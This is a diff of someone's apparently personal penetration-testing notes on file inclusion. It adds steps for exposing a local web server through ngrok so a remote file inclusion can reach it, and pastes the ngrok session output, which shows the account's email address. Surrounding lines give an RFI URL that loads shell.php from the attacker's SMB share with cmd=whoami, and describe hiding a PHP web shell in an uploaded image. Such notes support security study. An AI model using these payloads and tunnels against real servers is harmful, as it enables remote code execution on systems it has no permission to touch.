@@ -180,6 +180,29 @@ impacket-smbserver -smb2support share $(pwd)
 http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami
 ```
 Note: [[Server-Side Request Forgery (SSRF)]] techniques could also be used w/ `RFIs`
+
+If we can't call our local server, we can use [Ngrok](https://dashboard.ngrok.com/) that will forward our local server to an external URL 
+```bash
+# Setup our local web server
+python3 -m http.server 8000
+
+# Run Ngrok on our localhost port 8000. This will expose the url "https://grader-...." online, and will forward every request to our locally hosted web server
+ngrok http 8000
+ngrok                                                                                                               (Ctrl+C to quit)
+                                                                                                                                    
+Take our ngrok in production survey! https://forms.gle/aXiBFWzEA36DudFn6                                                            
+                                                                                                                                    
+Session Status                online                                                                                                
+Account                       theobailly8@gmail.com (Plan: Free)                                                                    
+Version                       3.39.1                                                                                                
+Region                        Europe (eu)                                                                                           
+Web Interface                 http://127.0.0.1:4040                                                                                 
+Forwarding                    https://grader-mortified-cobweb.ngrok-free.dev -> http://localhost:8000                               
+                                                                                                                                    
+Connections                   ttl     opn     rt1     rt5     p50     p90                                                           
+                              0       0       0.00    0.00    0.00    0.00 
+```
+
 ### File Uploads + LFI 
 For this, we'll need the vulnerable function to have `Execute` capabilities. We could store a `PHP web shell` within a `image.jpg` instead of "image data", and include it through the LFI vulnerability to get the code executed. The vulnerability `isn't in the upload form` like in [[File Upload]] but in the `file inclusion functionnality`, if we can reach `the path` our malicious uploaded image to get it executed 
 ```bash
